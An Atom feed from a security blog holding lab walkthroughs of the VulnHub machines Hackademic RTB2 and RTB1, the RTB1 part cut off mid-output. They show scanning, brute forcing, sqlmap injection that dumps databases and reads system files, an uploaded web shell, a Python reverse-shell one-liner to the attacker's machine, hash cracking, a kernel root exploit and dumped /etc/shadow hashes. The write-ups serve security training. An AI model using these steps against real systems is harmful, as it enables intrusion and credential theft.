<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Hackademic | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/hackademic/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-12-15T09:29:03+01:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Hackademic: RTB2]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/03/hackademic-rtb2/"/>
    <updated>2015-06-03T17:26:01+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/03/hackademic-rtb2</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/hackademic-rtb2,18/">Hackademic: RTB2</a></p>

<p>We gained the IP address 192.168.80.150 for our testing target.</p>

<p>Nmap output:
{% codeblock %}
root@kali32:# nmap 192.168.80.150 -p-</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-01 07:55 CEST
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 65.57% done; ETC: 07:55 (0:00:01 remaining)
Nmap scan report for 192.168.80.150
Host is up (0.00039s latency).
Not shown: 65533 closed ports
PORT    STATE    SERVICE
80/tcp  open     http
666/tcp filtered doom
MAC Address: 00:0C:29:74:B5:21 (VMware)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
{% endcodeblock %}</p>

<p>It seems that the port 666 is filtered by the firewall. After running nmap scan
several times, we found the port to be open.</p>

<p>{% codeblock %}
root@kali32:# nmap 192.168.80.150 -p-</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-01 07:55 CEST
Nmap scan report for 192.168.80.150
Host is up (0.00036s latency).
Not shown: 65533 closed ports
PORT    STATE    SERVICE
80/tcp  open     http
666/tcp filtered doom
MAC Address: 00:0C:29:74:B5:21 (VMware)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds</p>

<p>root@kali32:~# nmap 192.168.80.150 -p-</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-01 07:56 CEST
Nmap scan report for 192.168.80.150
Host is up (0.00038s latency).
Not shown: 65533 closed ports
PORT    STATE SERVICE
80/tcp  open  http
666/tcp open  doom
MAC Address: 00:0C:29:74:B5:21 (VMware)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
{% endcodeblock %}</p>

<p>Nikto output for port 80:
{% codeblock %}
root@kali32:~# nikto -h <a href="http://192.168.80.150/">http://192.168.80.150/</a></p>

<h2>- Nikto v2.1.6</h2>

<ul>
<li>Target IP:          192.168.80.150</li>
<li>Target Hostname:    192.168.80.150</li>
<li>Target Port:        80

<ul>
<li>Start Time:         2015-04-30 10:15:26 (GMT2)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>Server: Apache/2.2.14 (Ubuntu)</li>
<li>Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.7</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>Uncommon header &lsquo;tcn&rsquo; found, with contents: list</li>
<li>Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See <a href="http://www.wisec.it/sectou.php?id=4698ebdc59d15.">http://www.wisec.it/sectou.php?id=4698ebdc59d15.</a> The following alternatives for &lsquo;index&rsquo; were found: index.php</li>
<li>Apache/2.2.14 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</li>
<li>Web Server returns a valid response with junk HTTP methods, this may cause false positives.</li>
<li>OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>OSVDB-3268: /icons/: Directory indexing found.</li>
<li>Server leaks inodes via ETags, header found with file /icons/README, inode: 413560, size: 5108, mtime: Tue Aug 28 12:48:10 2007</li>
<li>OSVDB-3233: /icons/README: Apache default file found.</li>
<li>/phpmyadmin/: phpMyAdmin directory found</li>
<li>7495 requests: 0 error(s) and 15 item(s) reported on remote host

<ul>
<li>End Time:           2015-04-30 10:15:41 (GMT2) (15 seconds)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>1 host(s) tested
{% endcodeblock %}</li>
</ul>


<p>The web page suggests to look for SQLi, unfortunately we were not able to find
any here.</p>

<p>Trying hydra for bruteforce or joomscan (port 666) reveals us nothing new too.
{% codeblock %}
root@kali32:/tmp# hydra 192.168.80.150 http-form-post &ldquo;/check.php:username=^USER^&amp;password=^PASS^&amp;Submit=Check%21:wrong credentials&rdquo; -L /usr/share/ncrack/default.usr -P /usr/share/ncrack/default.pwd  -t 10 -w 30  -u -f
root@kali32:/tmp# joomscan -u <a href="http://192.168.80.150:666/index.php">http://192.168.80.150:666/index.php</a> -oh
{% endcodeblock %}</p>

<p>After a little time, we found SQLi in Joomla and dumped the whole database:
{% codeblock %}
root@kali32:/tmp# sqlmap -u &ldquo;<a href="http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test">http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test</a>&rdquo;  -p letter &ndash;dump-all
{% endcodeblock %}</p>

<p>Trying to crack MySQL hashes was without success.
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# cat user-f3649c95.csv
Host,User,Password,ssl_type,Drop_priv,File_priv,Grant_priv,Super_priv,Alter_priv,ssl_cipher,Index_priv,Event_priv,Create_priv,max_updates,Reload_priv,Delete_priv,Insert_priv,x509_issuer,Select_priv,Update_priv,Execute_priv,Show_db_priv,x509_subject,Process_priv,Trigger_priv,Shutdown_priv,max_questions,Show_view_priv,References_priv,max_connections,Repl_slave_priv,Repl_client_priv,Create_user_priv,Create_view_priv,Lock_tables_priv,Alter_routine_priv,Create_routine_priv,max_user_connections,Create_tmp_table_priv
localhost,root,<em>5D3C124406BF85494067182754131FF4DAB9C6C7,<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
HackademicRTB2,root,</em>5D3C124406BF85494067182754131FF4DAB9C6C7,<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
127.0.0.1,root,<em>5D3C124406BF85494067182754131FF4DAB9C6C7,<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
localhost,debian-sys-maint,</em>F36E6519B0B1D62AA2D5346EFAD66D1CAF248996,<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
localhost,phpmyadmin,*5D3C124406BF85494067182754131FF4DAB9C6C7,<blank>,N,N,N,N,N,<blank>,N,N,N,0,N,N,N,<blank>,N,N,N,N,<blank>,N,N,N,0,N,N,0,N,N,N,N,N,N,N,0,N</p>

<p>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# cat user-f3649c95.csv | cut -d, -f2-3 | sed &rsquo;s#,#:#&lsquo; > hashes.csv
root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# john &ndash;format=mysql-sha1 hashes.csv
{% endcodeblock %}</p>

<p>We parse the Joomla usernames and passwords and crack using John:
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv
id,gid,name,email,block,params,username,usertype,password,sendEmail,activation,registerDate,lastvisitDate
62,25,Administrator,admin@hackademirtb2.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,Administrator,Super Administrator,08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl,1,<blank>,2011-01-17 19:31:21,2011-01-22 16:38:49
63,18,John Smith,JSmith@hackademicrtb.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,JSmith,Registered,992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF,0,<blank>,2011-01-22 10:17:30,2011-01-25 15:02:13
64,18,Billy Tallor,BTallor@hackademic.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,BTallor,Registered,abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy,0,<blank>,2011-01-22 10:18:06,0000-00-00 00:00:00</p>

<p>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv | cut -d, -f 7,9 | sed -e &rsquo;s/:/\$/&lsquo; -e &rsquo;s/,/:/&rsquo;<br/>
username:password
Administrator:08f43b7f40fb0d56f6a8fb0271ec4710$n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
JSmith:992396d7fc19fd76393f359cb294e300$70NFLkBrApLamH9VNGjlViJLlJsB60KF
BTallor:abe1ae513c16f2a021329cc109071705$FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy</p>

<p>root@kali32:/usr/share/dirb# john &ndash;list=subformats
Format = dynamic_0   type = dynamic_0: md5($p) (raw-md5)
Format = dynamic_1   type = dynamic_1: md5($p.$s) (joomla)
Format = dynamic_2   type = dynamic_2: md5(md5($p)) (e107)
&hellip;</p>

<p>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv | cut -d, -f 7,9 | sed -e &rsquo;s/:/\$/&lsquo; -e &rsquo;s/,/:/&rsquo;  > /tmp/joomla.pass</p>

<p>root@kali32:~/.sqlmap/output/192.168.80.150/dump# john /tmp/joomla.pass  -format=dynamic_1
&hellip;
root@kali32:~/.sqlmap/output/192.168.80.150/dump# john /tmp/joomla.pass  -format=dynamic_1 &ndash;show
JSmith:matrix
BTallor:victim
test:test</p>

<p>3 password hashes cracked, 1 left
{% endcodeblock %}</p>

<p>Because the SQLi statements are executed by database root user, we can read or store arbitrary file to the server.
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u &ldquo;<a href="http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test">http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test</a>&rdquo;  -p letter &ndash;batch &ndash;file-read=/etc/passwd
root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u &ldquo;<a href="http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test">http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test</a>&rdquo;  -p letter &ndash;batch &ndash;file-read=/etc/issue
{% endcodeblock %}</p>

<p>The target is Ubuntu 10.04, we can predict better the filenames in /etc:
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u &ldquo;<a href="http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test">http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test</a>&rdquo;  -p letter &ndash;batch &ndash;file-read=/etc/phpmyadmin/config.inc.php</p>

<p>{% endcodeblock %}</p>

<p>We generate and upload the weevely shell, then upgrade to python shell over netcat:
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u &ldquo;<a href="http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test">http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test</a>&rdquo;  -p letter &ndash;batch &ndash;file-write=weevely.php &ndash;file-dest=/var/www/test1.php</p>

<p>root@kali32:/usr/share/exploitdb# nc -lp 1338</p>

<p>www-data@HackademicRTB2:/tmp $ python -c &ldquo;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo; 192.168.80.137 1338
www-data@HackademicRTB2:/tmp$
{% endcodeblock %}</p>

<p>The following credentials could be used to log in phpMyAdmin using root:
{% codeblock lang:php %}
www-data@HackademicRTB2:/var/www $ cat configuration.php
&lt;?php
class JConfig {
/<em> Site Settings </em>/
var $offline = &lsquo;0&rsquo;;
var $offline_message = &lsquo;This site is down for maintenance.<br /> Please check back again soon.&rsquo;;
var $sitename = &lsquo;Hackademic.RTB2&rsquo;;
var $editor = &lsquo;tinymce&rsquo;;
var $list_limit = &lsquo;20&rsquo;;
var $legacy = &lsquo;0&rsquo;;
/<em> Debug Settings </em>/
var $debug = &lsquo;0&rsquo;;
var $debug_lang = &lsquo;0&rsquo;;
/<em> Database Settings </em>/
var $dbtype = &lsquo;mysql&rsquo;;
var $host = &lsquo;localhost&rsquo;;
var $user = &lsquo;root&rsquo;;
var $password = &lsquo;yUtJklM97W&rsquo;;
var $db = &lsquo;joomla&rsquo;;
var $dbprefix = &lsquo;jos_&rsquo;;
/<em> Server Settings </em>/
var $live_site = &lsquo;&rsquo;;
var $secret = &lsquo;iFzlVUCg9BBPoUDU&rsquo;;
var $gzip = &lsquo;0&rsquo;;
var $error_reporting = &lsquo;-1&rsquo;;
var $helpurl = &lsquo;<a href="http://help.joomla.org">http://help.joomla.org</a>&rsquo;;
var $xmlrpc_server = &lsquo;0&rsquo;;
var $ftp_host = &lsquo;127.0.0.1&rsquo;;
var $ftp_port = &lsquo;21&rsquo;;
var $ftp_user = &lsquo;&rsquo;;
var $ftp_pass = &lsquo;&rsquo;;
var $ftp_root = &lsquo;&rsquo;;
var $ftp_enable = &lsquo;0&rsquo;;
var $force_ssl = &lsquo;0&rsquo;;
/<em> Locale Settings </em>/
var $offset = &lsquo;0&rsquo;;
var $offset_user = &lsquo;0&rsquo;;
/<em> Mail Settings </em>/
var $mailer = &lsquo;mail&rsquo;;
var $mailfrom = &lsquo;<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#97;&#100;&#109;&#x69;&#x6e;&#x40;&#104;&#x61;&#x63;&#107;&#x61;&#100;&#x65;&#x6d;&#x69;&#114;&#116;&#x62;&#x32;&#46;&#99;&#111;&#109;">&#x61;&#100;&#x6d;&#x69;&#x6e;&#64;&#x68;&#97;&#99;&#107;&#x61;&#x64;&#x65;&#109;&#x69;&#x72;&#x74;&#x62;&#50;&#x2e;&#99;&#x6f;&#x6d;</a>&rsquo;;
var $fromname = &lsquo;Hackademic.RTB2&rsquo;;
var $sendmail = &lsquo;/usr/sbin/sendmail&rsquo;;
var $smtpauth = &lsquo;0&rsquo;;
var $smtpsecure = &lsquo;none&rsquo;;
var $smtpport = &lsquo;25&rsquo;;
var $smtpuser = &lsquo;&rsquo;;
var $smtppass = &lsquo;&rsquo;;
var $smtphost = &lsquo;localhost&rsquo;;
/<em> Cache Settings </em>/
var $caching = &lsquo;0&rsquo;;
var $cachetime = &lsquo;15&rsquo;;
var $cache_handler = &lsquo;file&rsquo;;
/<em> Meta Settings </em>/
var $MetaDesc = &lsquo;Joomla! - the dynamic portal engine and content management system&rsquo;;
var $MetaKeys = &lsquo;joomla, Joomla&rsquo;;<br/>
var $MetaTitle = &lsquo;1&rsquo;;
var $MetaAuthor = &lsquo;1&rsquo;;
/<em> SEO Settings </em>/
var $sef           = &lsquo;0&rsquo;;
var $sef_rewrite   = &lsquo;0&rsquo;;
var $sef_suffix    = &lsquo;0&rsquo;;
/<em> Feed Settings </em>/
var $feed_limit   = 10;
var $feed_email   = &lsquo;author&rsquo;;
var $log_path = &lsquo;/var/www/logs&rsquo;;
var $tmp_path = &lsquo;/var/www/tmp&rsquo;;
/<em> Session Setting </em>/
var $lifetime = &lsquo;15&rsquo;;
var $session_handler = &lsquo;database&rsquo;;
}
?>
{% endcodeblock %}</p>

<p>We download the <a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester">Linux_Exploit_Suggester.pl</a> and use for finding an exploit for privilege escalation:</p>

<p>{% codeblock %}
www-data@HackademicRTB2:/tmp$ perl Linux_Exploit_Suggester.pl
perl Linux_Exploit_Suggester.pl</p>

<p>Kernel local: 2.6.32</p>

<p>Searching among 65 exploits&hellip;</p>

<p>Possible Exploits:
[+] american-sign-language
   CVE-2010-4347
   Source: <a href="http://www.securityfocus.com/bid/45408/">http://www.securityfocus.com/bid/45408/</a>
[+] can_bcm
   CVE-2010-2959
   Source: <a href="http://www.exploit-db.com/exploits/14814/">http://www.exploit-db.com/exploits/14814/</a>
[+] half_nelson
   Alt: econet    CVE-2010-3848
   Source: <a href="http://www.exploit-db.com/exploits/6851">http://www.exploit-db.com/exploits/6851</a>
[+] half_nelson1
   Alt: econet    CVE-2010-3848
   Source: <a href="http://www.exploit-db.com/exploits/17787/">http://www.exploit-db.com/exploits/17787/</a>
[+] half_nelson2
   Alt: econet    CVE-2010-3850
   Source: <a href="http://www.exploit-db.com/exploits/17787/">http://www.exploit-db.com/exploits/17787/</a>
[+] half_nelson3
   Alt: econet    CVE-2010-4073
   Source: <a href="http://www.exploit-db.com/exploits/17787/">http://www.exploit-db.com/exploits/17787/</a>
[+] msr
   CVE-2013-0268
   Source: <a href="http://www.exploit-db.com/exploits/27297/">http://www.exploit-db.com/exploits/27297/</a>
[+] pktcdvd
   CVE-2010-3437
   Source: <a href="http://www.exploit-db.com/exploits/15150/">http://www.exploit-db.com/exploits/15150/</a>
[+] ptrace_kmod2
   Alt: ia32syscall,robert_you_suck    CVE-2010-3301
   Source: <a href="http://www.exploit-db.com/exploits/15023/">http://www.exploit-db.com/exploits/15023/</a>
[+] rawmodePTY
   CVE-2014-0196
   Source: <a href="http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c">http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c</a>
[+] rds
   CVE-2010-3904
   Source: <a href="http://www.exploit-db.com/exploits/15285/">http://www.exploit-db.com/exploits/15285/</a>
[+] reiserfs
   CVE-2010-1146
   Source: <a href="http://www.exploit-db.com/exploits/12130/">http://www.exploit-db.com/exploits/12130/</a>
[+] video4linux
   CVE-2010-3081
   Source: <a href="http://www.exploit-db.com/exploits/15024/">http://www.exploit-db.com/exploits/15024/</a>
{% endcodeblock %}</p>

<p>We root the server using:
{% codeblock %}
<a href="https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15285.c">https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15285.c</a></p>

<p>[+] rds
   CVE-2010-3904
   Source: <a href="http://www.exploit-db.com/exploits/15285/">http://www.exploit-db.com/exploits/15285/</a>
{% endcodeblock %}</p>

<p>{% codeblock %}</p>

<h1>cat /etc/shadow</h1>

<p>cat /etc/shadow
root:$6$YB3puY.G$drg9.SqpJyPujoS82zbwdQtM7xgPpAJlDmdQaH8tu2ndUrmNwIx29lYazyhhsFKKF.yw6ScopFmMAh.t/qIZn0:14999:0:99999:7:::
daemon:<em>:14837:0:99999:7:::
bin:</em>:14837:0:99999:7:::
sys:<em>:14837:0:99999:7:::
sync:</em>:14837:0:99999:7:::
games:<em>:14837:0:99999:7:::
man:</em>:14837:0:99999:7:::
lp:<em>:14837:0:99999:7:::
mail:</em>:14837:0:99999:7:::
<a href="news:*:14837:0:99999:7:::">news:*:14837:0:99999:7:::</a>
uucp:<em>:14837:0:99999:7:::
proxy:</em>:14837:0:99999:7:::
www-data:<em>:14837:0:99999:7:::
backup:</em>:14837:0:99999:7:::
list:<em>:14837:0:99999:7:::
irc:</em>:14837:0:99999:7:::
gnats:<em>:14837:0:99999:7:::
nobody:</em>:14837:0:99999:7:::
libuuid:!:14837:0:99999:7:::
syslog:<em>:14837:0:99999:7:::
messagebus:</em>:14837:0:99999:7:::
avahi-autoipd:<em>:14837:0:99999:7:::
avahi:</em>:14837:0:99999:7:::
couchdb:<em>:14837:0:99999:7:::
speech-dispatcher:!:14837:0:99999:7:::
usbmux:</em>:14837:0:99999:7:::
haldaemon:<em>:14837:0:99999:7:::
kernoops:</em>:14837:0:99999:7:::
pulse:<em>:14837:0:99999:7:::
rtkit:</em>:14837:0:99999:7:::
saned:<em>:14837:0:99999:7:::
hplip:</em>:14837:0:99999:7:::
gdm:*:14837:0:99999:7:::
p0wnbox:$6$AT8lMX0W$GPAZaGLMX0mi5EPFhx9wT5qJu9bxkIEfH.cmKX/j/O3QpRWXgBQ2WUAa.SIoFGdcfKrv.FtuBVn1UonfItMrw1:14999:0:99999:7:::
mysql:!:14991:0:99999:7:::</p>

<h1>pwd</h1>

<p>pwd
/root</p>

<h1>ls -l</h1>

<p>ls -l
total 40
drwxr-xr-x 2 root root  4096 Jan 17  2011 Desktop
-rwxr-xr-x 1 root root 33921 Jan 22  2011 Key.txt</p>

<h1>cat /etc/knockd.conf</h1>

<p>cat /etc/knockd.conf
[options]
        UseSyslog</p>

<p>[openHTTPD]
        sequence    = 7000,8000,9000
        seq_timeout = 5
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp &ndash;dport 666 -j ACCEPT
        tcpflags    = syn</p>

<p>[closeHTTPD]
        sequence    = 9000,8000,7000
        seq_timeout = 5
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp &ndash;dport 666 -j ACCEPT
        tcpflags    = syn</p>

<h1>base64 -d /root/Key.txt > /var/www/key.png</h1>

<p>base64 -d /root/Key.txt > /var/www/key.png
{% endcodeblock %}</p>

<p>We can check the flag <a href="http://192.168.80.150:666/key.png">here</a>. As we can see
from output above, there is port-knocking mechanism using sequences 7000,8000,9000.</p>

<p>Finally we want to see the check.php source:
{% codeblock lang:php %}</p>

<h1>cat /var/www/welcome/check.php</h1>

<p>cat /var/www/welcome/check.php
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></p>

<p><html>
<head>
<title>Hackademic.RTB2</title></p>

<p><center>
<br><br><br>
<body bgcolor="black">
<img src="hackademicrtb2.png">
<font color="green">
</head>
</form>
<body>
<h2>
<br>
&lt;?php
$pass_answer = &ldquo;&lsquo; or 1=1&ndash;&rsquo;&rdquo;;
$pass_answer_2 = &ldquo;&lsquo; OR 1=1&ndash;&rsquo;&rdquo;;</p>

<p>if($<em>POST[&lsquo;password&rsquo;] == $pass_answer or $</em>POST[&lsquo;password&rsquo;] == $pass_answer_2){
        echo &lsquo;<h2>&rsquo;;
        echo &lsquo;Ok, nice shot&hellip;&rsquo;;
        echo &lsquo;<br>&rsquo;;
        echo &lsquo;</h2>&rsquo;;
        echo &lsquo;&hellip;but, you are looking in a wrong place bro! ;-)&rsquo;;
        echo &lsquo;<br>&rsquo;;
        echo &lsquo;<br>&rsquo;;
        echo &lsquo;<font color="black">&rsquo;;
        echo &lsquorsquo;;
        echo &lsquo;</font color="black">&rsquo;;</p>

<p>}</p>

<p>else{ <br/>
        echo &lsquo;<h2>&rsquo;;
        echo &lsquo;You are trying to login with wrong credentials!&rsquo;;
        echo &lsquo;<br>&rsquo;;
        echo &lsquo;</h2>&rsquo;;
        echo &ldquo;Please try again&hellip;&rdquo;;
}
?>
{% endcodeblock %}</p>

<p>After decoding the hex characters and converting binary digits in ruby:
{% codeblock %}
irb(main):017:0>  [0b00110001, 0b00110000, 0b00110000, 0b00110001, 0b00111010, 0b00110001, 0b00110001, 0b00110000, 0b00110001, 0b00111010, 0b00110001, 0b00110000, 0b00110001, 0b00110001, 0b00111010, 0b00110001, 0b00110000, 0b00110000, 0b00110001].map{|x|x.chr}.join
=> &ldquo;1001:1101:1011:1001&rdquo;
{% endcodeblock %}</p>

<p>So the SQLi test is validated using string compare operator and it&rsquo;s quite
non-realistic (and unfair) to have two statements with the different case, that
was the reason why we didn&rsquo;t found out this firstly.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackademic: RTB1]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1/"/>
    <updated>2015-05-29T14:32:12+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">Hackademic: RTB1</a></p>

<p>We gained the IP address 192.168.80.146 for our testing target.</p>

<p>Nmap output:
{% codeblock %}
root@kali32:~# nmap 192.168.80.146 -sV -p-</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-04-28 17:14 CEST
Nmap scan report for 192.168.80.146
Host is up (0.00032s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
MAC Address: 00:0C:29:01:8A:4D (VMware)</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 153.05 seconds
{% endcodeblock %}</p>

<p>Nikto output:
{% codeblock %}
root@kali32:~# nikto -h 192.168.80.146</p>

<h2>- Nikto v2.1.6</h2>

<ul>
<li>Target IP:          192.168.80.146</li>
<li>Target Hostname:    192.168.80.146</li>
<li>Target Port:        80

<ul>
<li>Start Time:         2015-04-28 17:18:04 (GMT2)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>Server: Apache/2.2.15 (Fedora)</li>
<li>Server leaks inodes via ETags, header found with file /, inode: 12748, size: 1475, mtime: Sun Jan  9 18:22:11 2011</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</li>
<li>Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE</li>
<li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</li>
<li>OSVDB-3268: /icons/: Directory indexing found.</li>
<li>OSVDB-3233: /icons/README: Apache default file found.</li>
<li>7354 requests: 0 error(s) and 7 item(s) reported on remote host

<ul>
<li>End Time:           2015-04-28 17:18:15 (GMT2) (11 seconds)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>1 host(s) tested
{% endcodeblock %}</li>
</ul>


<p>There was SQL injection on the web page, vulnerable wordpress instance:
{% codeblock %}
<a href="http://192.168.80.146/Hackademic_RTB1/?cat=1">http://192.168.80.146/Hackademic_RTB1/?cat=1</a>&#8217;
SELECT * FROM wp_categories WHERE cat_ID = 1&#92;&lsquo; LIMIT 1
{% endcodeblock %}</p>

<p>This will take longer and it&rsquo;s not necessery to dump everything:
{% codeblock %}
root@kali32:~# sqlmap -u &ldquo;<a href="http://192.168.80.146/Hackademic_RTB1/?cat=1">http://192.168.80.146/Hackademic_RTB1/?cat=1</a>&rdquo; &ndash;dump-all
{% endcodeblock %}</p>

<p>Some of the output:
{% codeblock %}
&ndash;current-user:
current user:    &lsquo;root@localhost&rsquo;
&ndash;current-db:
current database:    &lsquo;wordpress&rsquo;
&ndash;privileges:
[<em>] &lsquo;root&rsquo;@&lsquo;localhost&rsquo; (administrator) [27]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
&ndash;passwords:
database management system users password hashes:
[</em>] root [1]:
    password hash: 2eaec110380126d7
{% endcodeblock %}</p>

<p>The wordpress could be scanned using wpscan too:
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# wpscan <a href="http://192.168.80.146/Hackademic_RTB1">http://192.168.80.146/Hackademic_RTB1</a>
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# cat wp_users.csv
ID,user_idmode,user_ip,user_icq,user_msn,user_yim,user_url,user_aim,user_pass,user_login,user_level,user_email,user_status,user_domain,user_browser,user_nicename,user_nickname,user_lastname,user_firstname,user_registered,user_description,user_activation_key
1,login,<blank>,0,<blank>,<blank>,<a href="http://,">http://,</a><blank>,21232f297a57a5a743894a0e4a801fc3,NickJames,1,NickJames@hacked.com,0,<blank>,<blank>,nickjames,NickJames,James,Nick,2010-10-25 20:40:23,<blank>,<blank>
